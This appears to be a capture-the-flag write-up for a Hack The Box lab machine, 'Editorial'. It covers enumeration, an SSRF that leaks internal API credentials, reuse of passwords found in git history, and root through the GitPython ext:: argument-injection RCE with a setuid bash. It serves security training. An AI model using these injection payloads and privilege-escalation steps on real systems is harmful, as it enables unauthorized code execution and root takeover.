+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://editorial.htb/
+Total requests: 100000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+
+Total time: 213.4424
+Processed Requests: 100000
+Filtered Requests: 100000
+Requests/sec.: 468.5103
+
+
+</code></pre><p id="0442d74d-c60b-4404-8af8-6abb5af35f65" class="">
+</p><h2 id="482174fc-149e-4f8a-b39e-7dfe1f16d18d" class="">Web Tech enumeration</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7e5ea545-4c34-493f-a76f-82590982b0ea" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~]
+└─$ whatweb &quot;http://editorial.htb/&quot; -a 3   
+http://editorial.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.20], Title[Editorial Tiempo Arriba], X-UA-Compatible[IE=edge], nginx[1.18.0]
+</code></pre><figure id="5ebc904c-f142-4d5c-82d3-7de58bd47fc8" class="image"><a href="../img/Editorial/Untitled 3.png"><img style="width:1920px" src="../img/Editorial/Untitled 3.png"/></a></figure><h2 id="a7bf087f-d8c6-43da-ade0-4e35dfece184" class="">Findings</h2><ul id="040bf432-7dd9-41c4-8c4a-974d403db6ef" class="bulleted-list"><li style="list-style-type:disc">Upload File / Preview photo</li></ul><ul id="ff628571-1406-4bb6-87e1-7f0b2973ace5" class="bulleted-list"><li style="list-style-type:disc">Possible upload reverse shell</li></ul><ul id="35bddd42-21ff-457f-a4b2-731d8ff9add1" class="bulleted-list"><li style="list-style-type:disc">Possible SSRF</li></ul><p id="eb442207-9681-483b-b622-7973b287622b" class="">
+</p><h1 id="e0ff4889-099e-44df-811b-269310697c50" class="">User</h1><p id="4c0585ff-a934-4c55-8bbd-2a2f9481f8ef" class="">After discard webshell or reverse shell uploading php file or image modified with exiftool, Let’s try with SSRF. but NMAP does not show any other interesting open port, let’s try with other ports</p><figure id="fc286edb-6595-4e47-8be0-084d9e106e44" class="image"><a href="../img/Editorial/Untitled 4.png"><img style="width:708px" src="../img/Editorial/Untitled 4.png"/></a></figure><p id="97692309-b79c-468e-bf7e-6c35a3f6eac1" class="">
+</p><p id="98966f56-e4b9-489f-8652-52a3fef7c0bf" class="">Let’s use common web port’s to bruteforce and try to execute SSRF attack, if the response has 227 of length that means that port is not in use, any other means that port is open.</p><figure id="140e1400-db6d-48e2-a4ac-98f2741d7e6c" class="image"><a href="../img/Editorial/Untitled 5.png"><img style="width:708px" src="../img/Editorial/Untitled 5.png"/></a></figure><p id="faeece69-8418-4db9-9245-d4b5f84e5895" class="">Port 5000 opened, let’s see the response</p><figure id="d3e68152-ec5d-4428-b170-374488483f8d" class="image"><a href="../img/Editorial/Untitled 6.png"><img style="width:708px" src="../img/Editorial/Untitled 6.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5fc6db32-262d-4fdd-8536-71633e08d929" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">{&quot;messages&quot;:[{&quot;promotions&quot;:{&quot;description&quot;:&quot;Retrieve a list of all the promotions in our library.&quot;,&quot;endpoint&quot;:&quot;/api/latest/metadata/messages/promos&quot;,&quot;methods&quot;:&quot;GET&quot;}},{&quot;coupons&quot;:{&quot;description&quot;:&quot;Retrieve the list of coupons to use in our library.&quot;,&quot;endpoint&quot;:&quot;/api/latest/metadata/messages/coupons&quot;,&quot;methods&quot;:&quot;GET&quot;}},{&quot;new_authors&quot;:{&quot;description&quot;:&quot;Retrieve the welcome message sended to our new authors.&quot;,&quot;endpoint&quot;:&quot;/api/latest/metadata/messages/authors&quot;,&quot;methods&quot;:&quot;GET&quot;}},{&quot;platform_use&quot;:{&quot;description&quot;:&quot;Retrieve examples of how to use the platform.&quot;,&quot;endpoint&quot;:&quot;/api/latest/metadata/messages/how_to_use_platform&quot;,&quot;methods&quot;:&quot;GET&quot;}}],&quot;version&quot;:[{&quot;changelog&quot;:{&quot;description&quot;:&quot;Retrieve a list of all the versions and updates of the api.&quot;,&quot;endpoint&quot;:&quot;/api/latest/metadata/changelog&quot;,&quot;methods&quot;:&quot;GET&quot;}},{&quot;latest&quot;:{&quot;description&quot;:&quot;Retrieve the last version of api.&quot;,&quot;endpoint&quot;:&quot;/api/latest/metadata&quot;,&quot;methods&quot;:&quot;GET&quot;}}]}</code></pre><p id="5ea93056-4d56-46d3-8eba-37c2bd3ae8da" class="">
+</p><p id="67b2cf6d-c659-4a70-9bb3-b155c3811099" class="">Let’s try SSRF with </p><ul id="ae1bf2f4-85b1-4dde-a426-eec20a1595e9" class="bulleted-list"><li style="list-style-type:disc">http://127.0.0.1:5000/api/latest/metadata/messages/authors</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ea380abb-ea21-4a9b-a3b6-b4d6d6eaa0b4" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">{&quot;template_mail_message&quot;:&quot;Welcome to the team! We are thrilled to have you on board and can&#x27;t wait to see the incredible content you&#x27;ll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon&#x27;t hesitate to reach out if you have any questions or ideas - we&#x27;re always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team.&quot;}
+</code></pre><ul id="d1675bab-44cc-4504-98de-876095fb5331" class="bulleted-list"><li style="list-style-type:disc"><a href="http://127.0.0.1:5000/api/latest/metadata/messages/how_to_use_platform">http://127.0.0.1:5000/api/latest/metadata/messages/how_to_use_platform</a></li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5e9ae97e-6956-4349-812b-287d77856747" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
+</code></pre><ul id="ce9d6137-12f5-45c4-9e19-5c32c433e501" class="bulleted-list"><li style="list-style-type:disc"><a href="http://127.0.0.1:5000/api/latest/metadata/changelog">http://127.0.0.1:5000/api/latest/metadata/changelog</a></li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a42db117-1de2-4eb9-95ee-138d15869213" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">
+[{&quot;1&quot;:{&quot;api_route&quot;:&quot;/api/v1/metadata/&quot;,&quot;contact_email_1&quot;:&quot;soporte@tiempoarriba.oc&quot;,&quot;contact_email_2&quot;:&quot;info@tiempoarriba.oc&quot;,&quot;editorial&quot;:&quot;Editorial El Tiempo Por Arriba&quot;}},{&quot;1.1&quot;:{&quot;api_route&quot;:&quot;/api/v1.1/metadata/&quot;,&quot;contact_email_1&quot;:&quot;soporte@tiempoarriba.oc&quot;,&quot;contact_email_2&quot;:&quot;info@tiempoarriba.oc&quot;,&quot;editorial&quot;:&quot;Ed Tiempo Arriba&quot;}},{&quot;1.2&quot;:{&quot;contact_email_1&quot;:&quot;soporte@tiempoarriba.oc&quot;,&quot;contact_email_2&quot;:&quot;info@tiempoarriba.oc&quot;,&quot;editorial&quot;:&quot;Editorial Tiempo Arriba&quot;,&quot;endpoint&quot;:&quot;/api/v1.2/metadata/&quot;}},{&quot;2&quot;:{&quot;contact_email&quot;:&quot;info@tiempoarriba.moc.oc&quot;,&quot;editorial&quot;:&quot;Editorial Tiempo Arriba&quot;,&quot;endpoint&quot;:&quot;/api/v2/metadata/&quot;}}]</code></pre><ul id="259ac5b1-27d8-4d76-90bc-30ffbe159d07" class="bulleted-list"><li style="list-style-type:disc"><a href="http://127.0.0.1:5000/api/latest/metadata">http://127.0.0.1:5000/api/latest/metadata</a></li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="712cb144-4c80-428d-b22f-816811a03998" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
+</code></pre><p id="b59c0e7c-a317-450b-bde6-fd7bb45b7fbb" class="">
+</p><p id="d5523096-d5f6-4195-8733-9c1f36ee607a" class="">Got it!</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="67476f9a-c664-4c3d-82ac-9b58bffac0fd" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ ssh dev@editorial.htb
+The authenticity of host &#x27;editorial.htb (10.10.11.20)&#x27; can&#x27;t be established.
+ED25519 key fingerprint is SHA256:YR+ibhVYSWNLe4xyiPA0g45F4p1pNAcQ7+xupfIR70Q.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#x27;editorial.htb&#x27; (ED25519) to the list of known hosts.
+dev@editorial.htb&#x27;s password: 
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Mon Jun 24 04:50:24 AM UTC 2024
+
+  System load:           0.0
+  Usage of /:            61.0% of 6.35GB
+  Memory usage:          12%
+  Swap usage:            0%
+  Processes:             225
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.20
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:42c5
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Mon Jun 10 09:11:03 2024 from 10.10.14.52
+dev@editorial:~$ whoami
+dev
+dev@editorial:~$ cat /home/dev/user.txt 
+6*******************************b
+</code></pre><p id="c537dd4f-c8ab-4b69-a9fb-960faaeafa1d" class="">
+</p><h1 id="f8a3b521-4a4f-4945-a498-5a57b1b964ab" class="">Root</h1><p id="7df9bdf6-4ea5-4974-b5ba-6118c2fd3c2c" class="">I can see .git folder</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9fc495a3-6a2f-4456-bda9-4b9f558792a8" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">dev@editorial:~/apps/.git/logs$ cat HEAD 
+0000000000000000000000000000000000000000 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8 dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt; 1682905723 -0500	commit (initial): feat: create editorial app
+3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8 1e84a036b2f33c59e2390730699a488c65643d28 dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt; 1682905870 -0500	commit: feat: create api to editorial info
+1e84a036b2f33c59e2390730699a488c65643d28 b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt; 1682906108 -0500	commit: change(api): downgrading prod to dev
+b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae dfef9f20e57d730b7d71967582035925d57ad883 dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt; 1682906471 -0500	commit: change: remove debug and update api port
+dfef9f20e57d730b7d71967582035925d57ad883 8ad0f3187e2bda88bba85074635ea942974587e8 dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt; 1682906661 -0500	commit: fix: bugfix in api port endpoint
+</code></pre><p id="018b7cc9-5556-40ac-981f-b4c03b2c8a95" class="">Execute </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d524dcc4-2347-40b5-b3c0-7bba91e37676" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">dev@editorial:~/apps$ git reset --hard 1e84a036b2f33c59e2390730699a488c65643d28
+dev@editorial:~/apps/app_api$ cat app.py 
+# API (in development).
+# * To retrieve info about editorial
+
+import json
+from flask import Flask, jsonify
+
+# -------------------------------
+# App configuration
+# -------------------------------
+app = Flask(__name__)
+
+# -------------------------------
+# Global Variables
+# -------------------------------
+api_route = &quot;/api/latest/metadata&quot;
+api_editorial_name = &quot;Editorial Tiempo Arriba&quot;
+api_editorial_email = &quot;info@tiempoarriba.htb&quot;
+
+# -------------------------------
+# API routes
+# -------------------------------
+# -- : home
+@app.route(&#x27;/api&#x27;, methods=[&#x27;GET&#x27;])
+def index():
+    data_editorial = {
+        &#x27;version&#x27;: [{
+            &#x27;1&#x27;: {
+                &#x27;editorial&#x27;: &#x27;Editorial El Tiempo Por Arriba&#x27;, 
+                &#x27;contact_email_1&#x27;: &#x27;soporte@tiempoarriba.oc&#x27;,
+                &#x27;contact_email_2&#x27;: &#x27;info@tiempoarriba.oc&#x27;,
+                &#x27;api_route&#x27;: &#x27;/api/v1/metadata/&#x27;
+            }},
+            {
+            &#x27;1.1&#x27;: {
+                &#x27;editorial&#x27;: &#x27;Ed Tiempo Arriba&#x27;, 
+                &#x27;contact_email_1&#x27;: &#x27;soporte@tiempoarriba.oc&#x27;,
+                &#x27;contact_email_2&#x27;: &#x27;info@tiempoarriba.oc&#x27;,
+                &#x27;api_route&#x27;: &#x27;/api/v1.1/metadata/&#x27;
+            }},
+            {
+            &#x27;1.2&#x27;: {
+                &#x27;editorial&#x27;: api_editorial_name, 
+                &#x27;contact_email_1&#x27;: &#x27;soporte@tiempoarriba.oc&#x27;,
+                &#x27;contact_email_2&#x27;: &#x27;info@tiempoarriba.oc&#x27;,
+                &#x27;api_route&#x27;: f&#x27;/api/v1.2/metadata/&#x27;
+            }},
+            {
+            &#x27;2&#x27;: {
+                &#x27;editorial&#x27;: api_editorial_name, 
+                &#x27;contact_email&#x27;: &#x27;info@tiempoarriba.moc.oc&#x27;,
+                &#x27;api_route&#x27;: f&#x27;/api/v2/metadata/&#x27;
+            }},
+            {
+            &#x27;2.3&#x27;: {
+                &#x27;editorial&#x27;: api_editorial_name, 
+                &#x27;contact_email&#x27;: api_editorial_email,
+                &#x27;api_route&#x27;: f&#x27;{api_route}/&#x27;
+            }
+        }]
+    }
+    return jsonify(data_editorial)
+
+# -- : (development) mail message to new authors
+@app.route(api_route + &#x27;/authors/message&#x27;, methods=[&#x27;GET&#x27;])
+def api_mail_new_authors():
+    return jsonify({
+        &#x27;template_mail_message&#x27;: &quot;Welcome to the team! We are thrilled to have you on board and can&#x27;t wait to see the incredible content you&#x27;ll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon&#x27;t hesitate to reach out if you have any questions or ideas - we&#x27;re always here to support you.\n\nBest regards, &quot; + api_editorial_name + &quot; Team.&quot;
+    }) # TODO: replace dev credentials when checks pass
+
+# -------------------------------
+# Start program
+# -------------------------------
+if __name__ == &#x27;__main__&#x27;:
+    app.run(host=&#x27;127.0.0.1&#x27;, port=5001, debug=True)
+
+</code></pre><p id="9810a4db-7e4d-4957-a5da-c0c72f99800f" class="">Got SSH!</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4b8fb887-8eb0-4c03-ac3f-a3699f7e765e" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/…/main/htb/toolsToGit/Tools]
+└─$ ssh prod@editorial.htb
+prod@editorial.htb&#x27;s password: 
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Mon Jun 24 05:09:05 AM UTC 2024
+
+  System load:           0.0
+  Usage of /:            61.3% of 6.35GB
+  Memory usage:          18%
+  Swap usage:            0%
+  Processes:             236
+  Users logged in:       1
+  IPv4 address for eth0: 10.10.11.20
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:42c5
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+prod@editorial:~$ whoami
+prod
+prod@editorial:~$ sudo -l
+[sudo] password for prod: 
+Matching Defaults entries for prod on editorial:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User prod may run the following commands on editorial:
+    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
+
+</code></pre><p id="8284f876-d4b4-4cc9-beb8-4100b5f9d78b" class="">Reading the .py file</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e4e6c28a-677b-4921-91c8-66c0dcea8fec" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">#!/usr/bin/python3
+
+import os
+import sys
+from git import Repo
+
+os.chdir(&#x27;/opt/internal_apps/clone_changes&#x27;)
+
+url_to_clone = sys.argv[1]
+
+r = Repo.init(&#x27;&#x27;, bare=True)
+r.clone_from(url_to_clone, &#x27;new_changes&#x27;, multi_options=[&quot;-c protocol.ext.allow=always&quot;])
+</code></pre><p id="af731843-bd08-461c-b46a-0deaf07bd404" class="">Search it on google “r.clone_from”(cuz this code read arguments), found a <a href="https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858">RCE on gitpython library</a></p><p id="daa97efb-f36a-4522-bc57-13f9a14ca73a" class="">it’s possible execute code writing payload on argument</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b80a44b1-dc7d-4ca1-8e62-446deb95c163" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">from git import Repo
+r = Repo.init(&#x27;&#x27;, bare=True)
+r.clone_from(&#x27;ext::sh -c touch% /tmp/pwned&#x27;, &#x27;tmp&#x27;, multi_options=[&quot;-c protocol.ext.allow=always&quot;])</code></pre><p id="dc8e9864-8886-4f5a-a094-9e2888640754" class=""><a href="https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#cve-2022-24439-gitpython-rce">Privilege Escalation</a> here</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="61bdea28-2058-4b83-81a1-1bb7e9f76be3" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py  &#x27;ext::sh -c chmod% +s% /bin/bash&#x27;
+Traceback (most recent call last):
+  File &quot;/opt/internal_apps/clone_changes/clone_prod_change.py&quot;, line 12, in &lt;module&gt;
+    r.clone_from(url_to_clone, &#x27;new_changes&#x27;, multi_options=[&quot;-c protocol.ext.allow=always&quot;])
+  File &quot;/usr/local/lib/python3.10/dist-packages/git/repo/base.py&quot;, line 1275, in clone_from
+    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
+  File &quot;/usr/local/lib/python3.10/dist-packages/git/repo/base.py&quot;, line 1194, in _clone
+    finalize_process(proc, stderr=stderr)
+  File &quot;/usr/local/lib/python3.10/dist-packages/git/util.py&quot;, line 419, in finalize_process
+    proc.wait(**kwargs)
+  File &quot;/usr/local/lib/python3.10/dist-packages/git/cmd.py&quot;, line 559, in wait
+    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
+git.exc.GitCommandError: Cmd(&#x27;git&#x27;) failed due to: exit code(128)
+  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c chmod% +s% /bin/bash new_changes
+  stderr: &#x27;Cloning into &#x27;new_changes&#x27;...
+fatal: Could not read from remote repository.
+
+Please make sure you have the correct access rights
+and the repository exists.
+
+prod@editorial:/opt/internal_apps/clone_changes$ /bin/bash -p
+bash-5.1# whoami
+root
+bash-5.1# cat /root/root.txt 
+4*******************************b
+</code></pre><p id="d60389f1-9866-4b33-aaf9-a411b1ebacc6" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
